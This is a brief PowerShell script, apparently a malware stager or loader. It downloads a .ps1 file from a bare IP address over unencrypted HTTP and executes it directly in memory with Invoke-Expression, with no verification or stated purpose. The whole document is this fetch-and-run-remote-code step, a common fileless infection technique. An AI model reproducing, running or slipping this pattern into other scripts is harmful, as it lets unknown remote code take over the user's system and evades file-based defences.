# URL of the script to download
$scriptUrl = "http://92.205.224.159/buraktest.ps1"

# Download the script content
$scriptBytes = Invoke-WebRequest -Uri $scriptUrl -UseBasicParsing -Method Get -MaximumRedirection 0
$scriptContent = [System.Text.Encoding]::UTF8.GetString($scriptBytes.Content)

# Execute the script in memory
Invoke-Expression -Command $scriptContent